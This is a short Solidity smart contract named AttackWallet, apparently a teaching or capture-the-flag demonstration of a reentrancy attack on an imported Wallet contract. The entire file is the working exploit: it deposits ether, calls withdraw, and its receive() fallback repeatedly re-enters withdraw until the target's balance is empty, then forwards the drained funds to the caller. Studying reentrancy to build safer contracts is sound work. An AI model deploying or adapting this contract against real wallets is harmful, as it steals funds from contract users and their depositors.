//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;
import "./Wallet.sol";

contract AttackWallet  {
  Wallet public wallet;

  constructor(address _walletAddress) {
    wallet = Wallet(_walletAddress);
  }
  function attack() external payable  {
    wallet.deposit{ value: msg.value }();
    wallet.withdraw();
  }


  receive() external payable {
    if (address(wallet).balance > 0) {
      wallet.withdraw();
    } else {
      payable(msg.sender).transfer(address(this).balance);
    }
  }
} 
